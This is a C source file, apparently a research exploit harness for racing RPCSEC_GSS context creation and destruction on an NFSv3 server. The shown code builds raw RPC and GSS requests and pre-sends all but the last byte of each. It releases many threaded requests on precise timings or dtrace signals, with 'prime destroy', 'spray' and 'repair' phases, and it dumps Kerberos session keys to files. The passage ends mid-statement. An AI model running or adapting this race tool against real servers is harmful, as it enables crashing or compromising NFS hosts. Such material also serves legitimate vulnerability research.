#include <GSS/gssapi.h>
#include <GSS/gssapi_krb5.h>
#include <arpa/inet.h>
#include <errno.h>
#include <limits.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

enum {
    RPC_CALL = 0,
    RPC_VERSION = 2,
    NFS_PROGRAM = 100003,
    NFS_VERSION = 3,
    NFS_NULL = 0,
    NFS_GETATTR = 1,
    NFS_READDIRPLUS = 17,
    NFS3_FH_MAX = 64,
    RPCSEC_GSS = 6,
    RPCSEC_GSS_VERSION = 1,
    RPCSEC_GSS_DATA = 0,
    RPCSEC_GSS_INIT = 1,
    RPCSEC_GSS_CONTINUE_INIT = 2,
    RPCSEC_GSS_SVC_NONE = 1,
    RPCSEC_GSS_SVC_INTEGRITY = 2,
    RPCSEC_GSS_SVC_PRIVACY = 3,
    DEFAULT_RACE_PRIVACY_PLAINTEXT_LENGTH = 32768,
    MAX_RACE_PRIVACY_PLAINTEXT_LENGTH = 15 * 1024 * 1024,
    MAX_RACE_REQUESTS = 512,
};

struct nfs_data_request_config {
    uint32_t procedure;
    uint32_t filehandle_length;
    uint8_t filehandle[NFS3_FH_MAX];
    uint32_t readdirplus_dircount;
    uint32_t readdirplus_maxcount;
};

static struct nfs_data_request_config nfs_data_request = {
    .procedure = NFS_GETATTR,
    .readdirplus_dircount = 256U * 1024U,
    .readdirplus_maxcount = 512U * 1024U,
};

static uint32_t rpcsec_data_service = RPCSEC_GSS_SVC_PRIVACY;

struct prepared_request {
    uint8_t *wire;
    size_t length;
    const char *kind;
    uint32_t nfs_proc;
    uint32_t gss_proc;
    size_t token_length;
};

struct race_worker {
    const char *host;
    const struct prepared_request *request;
    atomic_uint *ready;
    atomic_bool *go;
    atomic_ullong *go_ns;
    atomic_bool *data_sent;
    bool signal_data_sent;
    bool wait_for_data_sent;
    const char *wait_file;
    const char *reply_path;
    const char *data_reply_prefix;
    unsigned ordinal;
    unsigned delay_us;
    uint32_t prime_destroy_handle;
    uint32_t prime_destroy_xid;
    int result;
};

static volatile sig_atomic_t dtrace_release_requested;
static volatile sig_atomic_t dtrace_data_release_requested;
static volatile sig_atomic_t dtrace_second_data_release_requested;
static volatile sig_atomic_t dtrace_continue_release_requested;
static volatile sig_atomic_t dtrace_repair_release_requested;
static volatile sig_atomic_t dtrace_spray_stop_requested;

static void
handle_dtrace_release(int signal_number)
{
    (void)signal_number;
    dtrace_release_requested = 1;
}

static void
handle_dtrace_data_release(int signal_number)
{
    (void)signal_number;
    dtrace_data_release_requested = 1;
}

static void
handle_dtrace_second_data_release(int signal_number)
{
    (void)signal_number;
    dtrace_second_data_release_requested = 1;
}

static void
handle_dtrace_continue_release(int signal_number)
{
    (void)signal_number;
    dtrace_continue_release_requested = 1;
}

static void
handle_dtrace_repair_release(int signal_number)
{
    (void)signal_number;
    dtrace_repair_release_requested = 1;
}

static void
handle_dtrace_spray_stop(int signal_number)
{
    (void)signal_number;
    dtrace_spray_stop_requested = 1;
}

static void print_status(const char *, OM_uint32, OM_uint32);

static uint64_t
monotonic_ns(void)
{
    struct timespec ts;

    if (clock_gettime(CLOCK_MONOTONIC_RAW, &ts) != 0) {
        return 0;
    }
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static uint64_t
realtime_ns(void)
{
    struct timespec ts;

    if (clock_gettime(CLOCK_REALTIME, &ts) != 0) {
        return 0;
    }
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static void
wait_until_delay_us(uint64_t anchor_ns, unsigned delay_us)
{
    uint64_t deadline_ns = anchor_ns + (uint64_t)delay_us * 1000ULL;

    for (;;) {
        uint64_t now_ns = monotonic_ns();

        if (now_ns >= deadline_ns) {
            return;
        }
        uint64_t remaining_ns = deadline_ns - now_ns;

        if (remaining_ns > 25000000ULL) {
            usleep((useconds_t)((remaining_ns - 20000000ULL) / 1000ULL));
            continue;
        }
        while (monotonic_ns() < deadline_ns) {
            __asm__ volatile("" ::: "memory");
        }
        return;
    }
}

static int
parse_delay_schedule(const char *text, unsigned count,
    unsigned delays[MAX_RACE_REQUESTS])
{
    const char *cursor;

    if (text == NULL || text[0] == '\0') {
        return 0;
    }
    cursor = text;
    for (unsigned i = 0; i < count; i++) {
        char *end = NULL;
        unsigned long value;

        errno = 0;
        value = strtoul(cursor, &end, 10);
        if (errno != 0 || end == cursor || value > 5000000UL ||
            (i != 0 && value < delays[i - 1]) ||
            (i + 1 < count && *end != ',') ||
            (i + 1 == count && *end != '\0')) {
            return -1;
        }
        delays[i] = (unsigned)value;
        cursor = end + (i + 1 < count ? 1 : 0);
    }
    return 1;
}

static int
export_lucid_context(const char *path, gss_ctx_id_t *context)
{
    gss_krb5_lucid_context_v1_t *lucid = NULL;
    const gss_krb5_lucid_key_t *key;
    OM_uint32 major;
    OM_uint32 minor = 0;
    FILE *output;

    major = gss_krb5_export_lucid_sec_context(&minor, context, 1,
        (void **)&lucid);
    if (major != GSS_S_COMPLETE || lucid == NULL) {
        print_status("gss_krb5_export_lucid_sec_context", major, minor);
        return -1;
    }
    if (lucid->protocol == 0) {
        key = &lucid->rfc1964_kd.ctx_key;
    } else if (lucid->cfx_kd.have_acceptor_subkey) {
        key = &lucid->cfx_kd.acceptor_subkey;
    } else {
        key = &lucid->cfx_kd.ctx_key;
    }

    output = fopen(path, "w");
    if (output == NULL) {
        perror("open lucid output");
        gss_krb5_free_lucid_sec_context(&minor, lucid);
        return -1;
    }
    fprintf(output,
        "version=%u\ninitiate=%u\nprotocol=%u\nsend_seq=%llu\n"
        "recv_seq=%llu\nkey_type=%u\nkey_length=%u\nkey_hex=",
        lucid->version, lucid->initiate, lucid->protocol,
        (unsigned long long)lucid->send_seq,
        (unsigned long long)lucid->recv_seq,
        key->type, key->length);
    for (OM_uint32 index = 0; index < key->length; index++) {
        fprintf(output, "%02x", ((const uint8_t *)key->data)[index]);
    }
    fputc('\n', output);
    if (fclose(output) != 0) {
        perror("close lucid output");
        gss_krb5_free_lucid_sec_context(&minor, lucid);
        return -1;
    }
    printf("lucid_context=%s protocol=%u key_type=%u key_length=%u\n",
        path, lucid->protocol, key->type, key->length);
    fflush(stdout);
    gss_krb5_free_lucid_sec_context(&minor, lucid);
    return 0;
}

static void
dump_context_oid(FILE *output, gss_ctx_id_t context, const char *name,
    gss_OID oid)
{
    gss_buffer_set_t buffers = GSS_C_NO_BUFFER_SET;
    OM_uint32 major;
    OM_uint32 minor = 0;

    major = gss_inquire_sec_context_by_oid(&minor, context, oid, &buffers);
    fprintf(output, "%s_major=0x%08x\n%s_minor=0x%08x\n", name, major,
        name, minor);
    if (major == GSS_S_COMPLETE && buffers != GSS_C_NO_BUFFER_SET) {
        fprintf(output, "%s_count=%zu\n", name, buffers->count);
        for (size_t index = 0; index < buffers->count; index++) {
            const uint8_t *bytes = buffers->elements[index].value;

            fprintf(output, "%s_%zu_length=%zu\n%s_%zu_hex=", name,
                index, buffers->elements[index].length, name, index);
            for (size_t offset = 0;
                offset < buffers->elements[index].length; offset++) {
                fprintf(output, "%02x", bytes[offset]);
            }
            fputc('\n', output);
        }
    }
    if (buffers != GSS_C_NO_BUFFER_SET)
        gss_release_buffer_set(&minor, &buffers);
}

static int
dump_context_keys(const char *path, gss_ctx_id_t context)
{
    FILE *output = fopen(path, "w");
    if (output == NULL) {
        perror("open context-key output");
        return -1;
    }
    dump_context_oid(output, context, "subkey", GSS_KRB5_GET_SUBKEY_X);
    dump_context_oid(output, context, "initiator_subkey",
        GSS_KRB5_GET_INITIATOR_SUBKEY_X);
    dump_context_oid(output, context, "acceptor_subkey",
        GSS_KRB5_GET_ACCEPTOR_SUBKEY_X);
    if (fflush(output) != 0 || fsync(fileno(output)) != 0 ||
        fclose(output) != 0) {
        perror("write context-key output");
        return -1;
    }
    printf("context_keys=%s\n", path);
    fflush(stdout);
    return 0;
}

static void
put_u32(uint8_t **cursor, uint32_t value)
{
    value = htonl(value);
    memcpy(*cursor, &value, sizeof(value));
    *cursor += sizeof(value);
}

static uint64_t
get_be64(const uint8_t input[8])
{
    uint64_t value = 0;

    for (unsigned index = 0; index < 8; index++) {
        value = (value << 8) | input[index];
    }
    return value;
}

static void
put_be64(uint8_t output[8], uint64_t value)
{
    for (unsigned index = 0; index < 8; index++) {
        output[7U - index] = (uint8_t)value;
        value >>= 8;
    }
}

static int
get_u32(const uint8_t **cursor, size_t *remaining, uint32_t *value)
{
    uint32_t encoded;

    if (*remaining < sizeof(encoded)) {
        return -1;
    }
    memcpy(&encoded, *cursor, sizeof(encoded));
    *cursor += sizeof(encoded);
    *remaining -= sizeof(encoded);
    *value = ntohl(encoded);
    return 0;
}

static int
read_u32_text_file(const char *path, uint32_t *value)
{
    char buffer[64];
    char *end = NULL;
    unsigned long long parsed;
    FILE *file;

    file = fopen(path, "r");
    if (file == NULL) {
        return -1;
    }
    if (fgets(buffer, sizeof(buffer), file) == NULL) {
        fclose(file);
        return -1;
    }
    fclose(file);
    errno = 0;
    parsed = strtoull(buffer, &end, 0);
    if (errno != 0 || end == buffer || parsed == 0 ||
        parsed > UINT32_MAX) {
        return -1;
    }
    while (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n') {
        end++;
    }
    if (*end != '\0') {
        return -1;
    }
    *value = (uint32_t)parsed;
    return 0;
}

static int
skip_opaque(const uint8_t **cursor, size_t *remaining, uint32_t length)
{
    size_t padded = ((size_t)length + 3U) & ~3U;

    if (padded > *remaining) {
        return -1;
    }
    *cursor += padded;
    *remaining -= padded;
    return 0;
}

static void
print_status(const char *label, OM_uint32 major, OM_uint32 minor)
{
    OM_uint32 context = 0;
    OM_uint32 next_minor = 0;
    gss_buffer_desc text = GSS_C_EMPTY_BUFFER;

    fprintf(stderr, "%s: major=0x%08x minor=0x%08x\n",
        label, major, minor);
    do {
        if (gss_display_status(&next_minor, major, GSS_C_GSS_CODE,
            GSS_C_NO_OID, &context, &text) != GSS_S_COMPLETE) {
            break;
        }
        fprintf(stderr, "  GSS: %.*s\n", (int)text.length,
            (const char *)text.value);
        gss_release_buffer(&next_minor, &text);
    } while (context != 0);
    context = 0;
    do {
        if (gss_display_status(&next_minor, minor, GSS_C_MECH_CODE,
            GSS_C_NO_OID, &context, &text) != GSS_S_COMPLETE) {
            break;
        }
        fprintf(stderr, "  mech: %.*s\n", (int)text.length,
            (const char *)text.value);
        gss_release_buffer(&next_minor, &text);
    } while (context != 0);
}

static int
write_blob(const char *path, const void *data, size_t length)
{
    FILE *file = fopen(path, "wb");

    if (file == NULL) {
        return -1;
    }
    if (length != 0 && fwrite(data, 1, length, file) != length) {
        fclose(file);
        return -1;
    }
    return fclose(file);
}

static int
write_blob_atomic(const char *path, const void *data, size_t length)
{
    char temporary[PATH_MAX];
    int written;

    written = snprintf(temporary, sizeof(temporary), "%s.tmp", path);
    if (written < 0 || (size_t)written >= sizeof(temporary)) {
        errno = ENAMETOOLONG;
        return -1;
    }
    unlink(temporary);
    if (write_blob(temporary, data, length) < 0) {
        return -1;
    }
    if (rename(temporary, path) < 0) {
        unlink(temporary);
        return -1;
    }
    return 0;
}

static int
read_blob(const char *path, uint8_t **data, size_t *length)
{
    FILE *file;
    long end;
    uint8_t *buffer;

    *data = NULL;
    *length = 0;
    file = fopen(path, "rb");
    if (file == NULL) {
        return -1;
    }
    if (fseek(file, 0, SEEK_END) != 0 ||
        (end = ftell(file)) <= 0 ||
        (unsigned long)end > UINT32_MAX ||
        fseek(file, 0, SEEK_SET) != 0) {
        fclose(file);
        errno = EINVAL;
        return -1;
    }
    buffer = malloc((size_t)end);
    if (buffer == NULL) {
        fclose(file);
        return -1;
    }
    if (fread(buffer, 1, (size_t)end, file) != (size_t)end ||
        fclose(file) != 0) {
        free(buffer);
        return -1;
    }
    *data = buffer;
    *length = (size_t)end;
    return 0;
}

static int
configure_nfs_data_request(const char *filehandle_path,
    const char *procedure_text, const char *dircount_text,
    const char *maxcount_text)
{
    uint8_t *blob = NULL;
    size_t blob_length = 0;
    uint32_t filehandle_length;
    const char *texts[2] = { dircount_text, maxcount_text };
    uint32_t *values[2] = {
        &nfs_data_request.readdirplus_dircount,
        &nfs_data_request.readdirplus_maxcount,
    };

    if (filehandle_path == NULL || filehandle_path[0] == '\0') {
        if ((procedure_text != NULL && procedure_text[0] != '\0') ||
            (dircount_text != NULL && dircount_text[0] != '\0') ||
            (maxcount_text != NULL && maxcount_text[0] != '\0')) {
            errno = EINVAL;
            return -1;
        }
        return 0;
    }
    if (read_blob(filehandle_path, &blob, &blob_length) < 0) {
        return -1;
    }
    if (blob_length < sizeof(filehandle_length)) {
        goto invalid;
    }
    memcpy(&filehandle_length, blob, sizeof(filehandle_length));
    if (filehandle_length == 0 || filehandle_length > NFS3_FH_MAX ||
        blob_length != sizeof(filehandle_length) + filehandle_length) {
        goto invalid;
    }
    for (unsigned index = 0; index < 2; index++) {
        char *end = NULL;
        unsigned long parsed;

        if (texts[index] == NULL || texts[index][0] == '\0') {
            continue;
        }
        errno = 0;
        parsed = strtoul(texts[index], &end, 0);
        if (errno != 0 || end == texts[index] || *end != '\0' ||
            parsed < 1024UL || parsed > 768UL * 1024UL) {
            goto invalid;
        }
        *values[index] = (uint32_t)parsed;
    }
    if (nfs_data_request.readdirplus_dircount >
        nfs_data_request.readdirplus_maxcount) {
        goto invalid;
    }
    if (procedure_text == NULL || procedure_text[0] == '\0' ||
        strcmp(procedure_text, "readdirplus") == 0) {
        nfs_data_request.procedure = NFS_READDIRPLUS;
    } else if (strcmp(procedure_text, "getattr") == 0) {
        nfs_data_request.procedure = NFS_GETATTR;
    } else {
        goto invalid;
    }
    nfs_data_request.filehandle_length = filehandle_length;
    memcpy(nfs_data_request.filehandle, blob + sizeof(filehandle_length),
        filehandle_length);
    free(blob);
    return 0;

invalid:
    free(blob);
    errno = EINVAL;
    return -1;
}

static int
connect_server(const char *host)
{
    struct sockaddr_in address = {
        .sin_family = AF_INET,
        .sin_port = htons(2049),
    };
    const char *timeout_env = getenv("RPC_GSS_SOCKET_TIMEOUT_SECONDS");
    unsigned long timeout_seconds = 5;
    struct timeval timeout = {
        .tv_sec = 5,
        .tv_usec = 0,
    };
    char *timeout_end = NULL;
    int one = 1;
    int fd;

    if (timeout_env != NULL && timeout_env[0] != '\0') {
        errno = 0;
        timeout_seconds = strtoul(timeout_env, &timeout_end, 10);
        if (errno != 0 || timeout_end == timeout_env ||
            *timeout_end != '\0' || timeout_seconds < 1 ||
            timeout_seconds > 120) {
            errno = EINVAL;
            return -1;
        }
        timeout.tv_sec = (time_t)timeout_seconds;
    }
    if (inet_pton(AF_INET, host, &address.sin_addr) != 1) {
        return -1;
    }
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return -1;
    }
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    if (connect(fd, (const struct sockaddr *)&address, sizeof(address)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int
send_all(int fd, const uint8_t *buffer, size_t length)
{
    while (length > 0) {
        ssize_t sent = send(fd, buffer, length, 0);
        if (sent <= 0) {
            return -1;
        }
        buffer += (size_t)sent;
        length -= (size_t)sent;
    }
    return 0;
}

static int
read_all(int fd, uint8_t *buffer, size_t length)
{
    while (length > 0) {
        ssize_t got = recv(fd, buffer, length, 0);
        if (got <= 0) {
            return -1;
        }
        buffer += (size_t)got;
        length -= (size_t)got;
    }
    return 0;
}

static uint8_t *
build_init_request(const gss_buffer_desc *token, uint32_t xid,
    size_t *wire_length)
{
    size_t padded = (token->length + 3U) & ~3U;
    size_t body_length = 68U + padded;
    uint8_t *wire = calloc(1, 4U + body_length);
    uint8_t *cursor;
    uint32_t marker;

    if (wire == NULL || token->length > UINT32_MAX) {
        free(wire);
        return NULL;
    }
    marker = htonl(0x80000000U | (uint32_t)body_length);
    memcpy(wire, &marker, sizeof(marker));
    cursor = wire + 4;

    put_u32(&cursor, xid);
    put_u32(&cursor, RPC_CALL);
    put_u32(&cursor, RPC_VERSION);
    put_u32(&cursor, NFS_PROGRAM);
    put_u32(&cursor, NFS_VERSION);
    put_u32(&cursor, NFS_NULL);

    put_u32(&cursor, RPCSEC_GSS);
    put_u32(&cursor, 20);
    put_u32(&cursor, RPCSEC_GSS_VERSION);
    put_u32(&cursor, RPCSEC_GSS_INIT);
    put_u32(&cursor, 0);
    put_u32(&cursor, RPCSEC_GSS_SVC_NONE);
    put_u32(&cursor, 0);

    put_u32(&cursor, 0);
    put_u32(&cursor, 0);

    put_u32(&cursor, (uint32_t)token->length);
    memcpy(cursor, token->value, token->length);
    *wire_length = 4U + body_length;
    return wire;
}

static uint8_t *
build_continue_request(uint32_t handle, const uint8_t *token,
    size_t token_length, uint32_t xid, size_t *wire_length)
{
    size_t padded;
    size_t body_length;
    uint8_t *wire;
    uint8_t *cursor;
    uint32_t marker;

    if (token_length > UINT32_MAX) {
        return NULL;
    }
    padded = (token_length + 3U) & ~3U;
    body_length = 68U + padded;
    if (body_length > UINT32_MAX) {
        return NULL;
    }
    wire = calloc(1, 4U + body_length);
    if (wire == NULL) {
        return NULL;
    }

    marker = htonl(0x80000000U | (uint32_t)body_length);
    memcpy(wire, &marker, sizeof(marker));
    cursor = wire + 4;

    put_u32(&cursor, xid);
    put_u32(&cursor, RPC_CALL);
    put_u32(&cursor, RPC_VERSION);
    put_u32(&cursor, NFS_PROGRAM);
    put_u32(&cursor, NFS_VERSION);
    put_u32(&cursor, NFS_NULL);

    put_u32(&cursor, RPCSEC_GSS);
    put_u32(&cursor, 24);
    put_u32(&cursor, RPCSEC_GSS_VERSION);
    put_u32(&cursor, RPCSEC_GSS_CONTINUE_INIT);
    put_u32(&cursor, 0);
    put_u32(&cursor, RPCSEC_GSS_SVC_NONE);
    put_u32(&cursor, sizeof(handle));
    put_u32(&cursor, handle);

    put_u32(&cursor, 0);
    put_u32(&cursor, 0);

    put_u32(&cursor, (uint32_t)token_length);
    if (token_length != 0) {
        memcpy(cursor, token, token_length);
    }
    *wire_length = 4U + body_length;
    return wire;
}

static uint8_t *
build_data_request(gss_ctx_id_t context, uint32_t handle,
    uint32_t sequence, uint32_t xid, size_t plaintext_length,
    size_t *wire_length)
{
    uint8_t header[56];
    uint8_t *cursor = header;
    uint8_t *plaintext_bytes = NULL;
    uint8_t *plaintext_cursor;
    gss_buffer_desc header_buffer = {
        .length = sizeof(header),
        .value = header,
    };
    gss_buffer_desc plaintext = {
        .length = plaintext_length,
        .value = NULL,
    };
    gss_buffer_desc header_mic = GSS_C_EMPTY_BUFFER;
    gss_buffer_desc body_mic = GSS_C_EMPTY_BUFFER;
    gss_buffer_desc wrapped = GSS_C_EMPTY_BUFFER;
    OM_uint32 major;
    OM_uint32 minor = 0;
    int confidential = 0;
    size_t header_mic_padded;
    size_t plaintext_padded = 0;
    size_t body_mic_padded = 0;
    size_t wrapped_padded = 0;
    size_t body_length;
    size_t next_length;
    uint8_t *wire = NULL;

    if (nfs_data_request.filehandle_length != 0) {
        size_t padded_filehandle =
            (nfs_data_request.filehandle_length + 3U) & ~3U;

        plaintext.length = sizeof(uint32_t) + sizeof(uint32_t) +
            padded_filehandle;
        if (nfs_data_request.procedure == NFS_READDIRPLUS) {
            plaintext.length += sizeof(uint64_t) + sizeof(uint64_t) +
                sizeof(uint32_t) + sizeof(uint32_t);
        }
    }
    plaintext_bytes = malloc(plaintext.length);
    if (plaintext_bytes == NULL) {
        goto out;
    }
    memset(plaintext_bytes, 0x41, plaintext.length);
    plaintext_cursor = plaintext_bytes;
    put_u32(&plaintext_cursor, sequence);
    if (nfs_data_request.filehandle_length != 0) {
        size_t padded_filehandle =
            (nfs_data_request.filehandle_length + 3U) & ~3U;

        put_u32(&plaintext_cursor, nfs_data_request.filehandle_length);
        memcpy(plaintext_cursor, nfs_data_request.filehandle,
            nfs_data_request.filehandle_length);
        plaintext_cursor += padded_filehandle;
        if (nfs_data_request.procedure == NFS_READDIRPLUS) {
            put_u32(&plaintext_cursor, 0);
            put_u32(&plaintext_cursor, 0);
            put_u32(&plaintext_cursor, 0);
            put_u32(&plaintext_cursor, 0);
            put_u32(&plaintext_cursor,
                nfs_data_request.readdirplus_dircount);
            put_u32(&plaintext_cursor,
                nfs_data_request.readdirplus_maxcount);
        }
    } else {
        put_u32(&plaintext_cursor, 0);
    }
    plaintext.value = plaintext_bytes;

    put_u32(&cursor, xid);
    put_u32(&cursor, RPC_CALL);
    put_u32(&cursor, RPC_VERSION);
    put_u32(&cursor, NFS_PROGRAM);
    put_u32(&cursor, NFS_VERSION);
    put_u32(&cursor, nfs_data_request.procedure);
    put_u32(&cursor, RPCSEC_GSS);
    put_u32(&cursor, 24);
    put_u32(&cursor, RPCSEC_GSS_VERSION);
    put_u32(&cursor, RPCSEC_GSS_DATA);
    put_u32(&cursor, sequence);
    put_u32(&cursor, rpcsec_data_service);
    put_u32(&cursor, sizeof(handle));
    put_u32(&cursor, handle);
    if ((size_t)(cursor - header) != sizeof(header)) {
        goto out;
    }

    major = gss_get_mic(&minor, context, GSS_C_QOP_DEFAULT,
        &header_buffer, &header_mic);
    if (major != GSS_S_COMPLETE) {
        print_status("gss_get_mic(header)", major, minor);
        goto out;
    }
    if (rpcsec_data_service == RPCSEC_GSS_SVC_INTEGRITY) {
        major = gss_get_mic(&minor, context, GSS_C_QOP_DEFAULT,
            &plaintext, &body_mic);
        if (major != GSS_S_COMPLETE) {
            print_status("gss_get_mic(body)", major, minor);
            goto out;
        }
    } else {
        major = gss_wrap(&minor, context, 1, GSS_C_QOP_DEFAULT,
            &plaintext, &confidential, &wrapped);
        if (major != GSS_S_COMPLETE || !confidential) {
            print_status("gss_wrap", major, minor);
            goto out;
        }
    }

    if (header_mic.length > UINT32_MAX ||
        header_mic.length > SIZE_MAX - 3U) {
        goto out;
    }
    header_mic_padded = (header_mic.length + 3U) & ~3U;
    if (__builtin_add_overflow(sizeof(header) + 8U, header_mic_padded,
        &body_length)) {
        goto out;
    }
    if (rpcsec_data_service == RPCSEC_GSS_SVC_INTEGRITY) {
        if (plaintext.length > UINT32_MAX || body_mic.length > UINT32_MAX ||
            plaintext.length > SIZE_MAX - 3U ||
            body_mic.length > SIZE_MAX - 3U) {
            goto out;
        }
        plaintext_padded = (plaintext.length + 3U) & ~3U;
        body_mic_padded = (body_mic.length + 3U) & ~3U;
        if (__builtin_add_overflow(body_length, 4U, &next_length) ||
            __builtin_add_overflow(next_length, plaintext_padded,
                &body_length) ||
            __builtin_add_overflow(body_length, 4U, &next_length) ||
            __builtin_add_overflow(next_length, body_mic_padded,
                &body_length)) {
            goto out;
        }
    } else {
        if (wrapped.length > UINT32_MAX || wrapped.length > SIZE_MAX - 3U) {
            goto out;
        }
        wrapped_padded = (wrapped.length + 3U) & ~3U;
        if (__builtin_add_overflow(body_length, 4U, &next_length) ||
            __builtin_add_overflow(next_length, wrapped_padded,
                &body_length)) {
            goto out;
        }
    }
    if (body_length > UINT32_MAX ||
        __builtin_add_overflow(4U, body_length, wire_length)) {
        goto out;
    }
    wire = calloc(1, *wire_length);
    if (wire == NULL) {
        goto out;
    }

    cursor = wire;
    put_u32(&cursor, 0x80000000U | (uint32_t)body_length);
    memcpy(cursor, header, sizeof(header));
    cursor += sizeof(header);
    put_u32(&cursor, RPCSEC_GSS);
    put_u32(&cursor, (uint32_t)header_mic.length);
    memcpy(cursor, header_mic.value, header_mic.length);
    cursor += header_mic_padded;
    if (rpcsec_data_service == RPCSEC_GSS_SVC_INTEGRITY) {
        put_u32(&cursor, (uint32_t)plaintext.length);
        memcpy(cursor, plaintext.value, plaintext.length);
        cursor += plaintext_padded;
        put_u32(&cursor, (uint32_t)body_mic.length);
        memcpy(cursor, body_mic.value, body_mic.length);
    } else {
        put_u32(&cursor, (uint32_t)wrapped.length);
        memcpy(cursor, wrapped.value, wrapped.length);
    }

out:
    if (header_mic.length != 0) {
        gss_release_buffer(&minor, &header_mic);
    }
    if (body_mic.length != 0) {
        gss_release_buffer(&minor, &body_mic);
    }
    if (wrapped.length != 0) {
        gss_release_buffer(&minor, &wrapped);
    }
    free(plaintext_bytes);
    return wire;
}

static int
read_record(int fd, uint8_t **body, size_t *body_length)
{
    uint32_t marker;
    size_t length;

    if (read_all(fd, (uint8_t *)&marker, sizeof(marker)) < 0) {
        return -1;
    }
    marker = ntohl(marker);
    length = marker & 0x7fffffffU;
    if ((marker & 0x80000000U) == 0 || length > (1U << 20)) {
        return -1;
    }
    *body = malloc(length);
    if (*body == NULL) {
        return -1;
    }
    if (read_all(fd, *body, length) < 0) {
        free(*body);
        *body = NULL;
        return -1;
    }
    *body_length = length;
    return 0;
}

static void *
run_race_worker(void *opaque)
{
    struct race_worker *worker = opaque;
    char data_reply_path[PATH_MAX];
    const char *all_data_reply_path = NULL;
    uint8_t *reply = NULL;
    size_t reply_length = 0;
    uint8_t *prime_wire = NULL;
    size_t prime_wire_length = 0;
    uint8_t *prime_reply = NULL;
    size_t prime_reply_length = 0;
    bool prearmed = false;
    bool prime_locality = worker->prime_destroy_handle != 0;
    bool delay_from_go = true;
    int fd;

    (void)pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    fd = connect_server(worker->host);
    if (fd >= 0 && prime_locality) {
        uint32_t reply_xid;

        prime_wire = build_continue_request(worker->prime_destroy_handle,
            NULL, 0, worker->prime_destroy_xid, &prime_wire_length);
        if (prime_wire != NULL &&
            send_all(fd, prime_wire, prime_wire_length) == 0 &&
            read_record(fd, &prime_reply, &prime_reply_length) == 0 &&
            prime_reply_length >= sizeof(reply_xid)) {
            memcpy(&reply_xid, prime_reply, sizeof(reply_xid));
            reply_xid = ntohl(reply_xid);
            if (reply_xid == worker->prime_destroy_xid) {
                printf("prime_destroy_replied realtime_ns=%llu "
                    "monotonic_ns=%llu phase=prearm ordinal=%u "
                    "handle=%08x xid=%08x reply_len=%zu\n",
                    (unsigned long long)realtime_ns(),
                    (unsigned long long)monotonic_ns(),
                    worker->ordinal, worker->prime_destroy_handle,
                    worker->prime_destroy_xid, prime_reply_length);
                fflush(stdout);
                if (worker->request->length > 1 &&
                    send_all(fd, worker->request->wire,
                    worker->request->length - 1) == 0) {
                    prearmed = true;
                }
            }
        }
        if (!prearmed) {
            fprintf(stderr,
                "prime prearm failed ordinal=%u handle=%08x xid=%08x\n",
                worker->ordinal, worker->prime_destroy_handle,
                worker->prime_destroy_xid);
        }
    } else if (fd >= 0 && worker->request->length > 1 &&
        send_all(fd, worker->request->wire,
        worker->request->length - 1) == 0) {
        prearmed = true;
    }
    atomic_fetch_add_explicit(worker->ready, 1, memory_order_release);
    while (!atomic_load_explicit(worker->go, memory_order_acquire)) {
        sched_yield();
    }
    while (worker->wait_for_data_sent &&
        !atomic_load_explicit(worker->data_sent, memory_order_acquire)) {
        sched_yield();
    }
    if (worker->wait_for_data_sent) {
        delay_from_go = false;
    }
    if (worker->wait_file != NULL &&
        strcmp(worker->wait_file, "dtrace_signal") == 0) {
        while (!dtrace_release_requested) {
            (void)access(worker->wait_file, F_OK);
            usleep(100);
        }
    } else if (worker->wait_file != NULL &&
        strcmp(worker->wait_file, "dtrace_continue_signal") == 0) {
        while (!dtrace_continue_release_requested) {
            (void)access(worker->wait_file, F_OK);
            usleep(100);
        }
    } else if (worker->wait_file != NULL &&
        strcmp(worker->wait_file, "dtrace_signal2") == 0) {
        while (!dtrace_repair_release_requested) {
            (void)getpgid((pid_t)0x7b02);
            usleep(100);
        }
    } else if (worker->wait_file != NULL &&
        strcmp(worker->wait_file, "dtrace_data_signal") == 0) {
        while (!dtrace_data_release_requested) {
            (void)getpgid((pid_t)0x7b04);
        }
        delay_from_go = false;
    } else if (worker->wait_file != NULL &&
        strcmp(worker->wait_file, "dtrace_second_data_signal") == 0) {
        while (!dtrace_second_data_release_requested) {
            (void)getpgid((pid_t)0x7b05);
        }
        delay_from_go = false;
    } else if (worker->wait_file != NULL &&
        worker->wait_file[0] != '\0') {
        unsigned long polls;

        for (polls = 0; polls < 1200000UL; polls++) {
            if (access(worker->wait_file, F_OK) == 0) {
                break;
            }
            usleep(100);
        }
        if (polls == 1200000UL) {
            worker->result = -1;
            goto out;
        }
        delay_from_go = false;
    }
    if (worker->wait_file != NULL &&
        strcmp(worker->wait_file, "dtrace_signal2") == 0) {
        unsigned remaining = worker->delay_us;

        for (;;) {
            (void)getpgid((pid_t)0x7b03);
            if (dtrace_spray_stop_requested) {
                printf("race_request_suppressed kind=%s delay_us=%u "
                    "reason=exact_context\n", worker->request->kind,
                    worker->delay_us);
                fflush(stdout);
                worker->result = 0;
                goto out;
            }
            if (remaining == 0) {
                break;
            }
            unsigned slice = remaining > 1000U ? 1000U : remaining;

            usleep(slice);
            remaining -= slice;
        }
    } else if (worker->delay_us != 0) {
        uint64_t anchor_ns = delay_from_go ?
            atomic_load_explicit(worker->go_ns, memory_order_acquire) :
            monotonic_ns();

        wait_until_delay_us(anchor_ns, worker->delay_us);
    }

    int send_result = prearmed ?
        send_all(fd, worker->request->wire + worker->request->length - 1,
        1) : -1;
    printf("race_request_released realtime_ns=%llu monotonic_ns=%llu "
        "ordinal=%u delay_us=%u kind=%s nfs_proc=%u gss_proc=%u "
        "token_len=%zu send_result=%d\n",
        (unsigned long long)realtime_ns(),
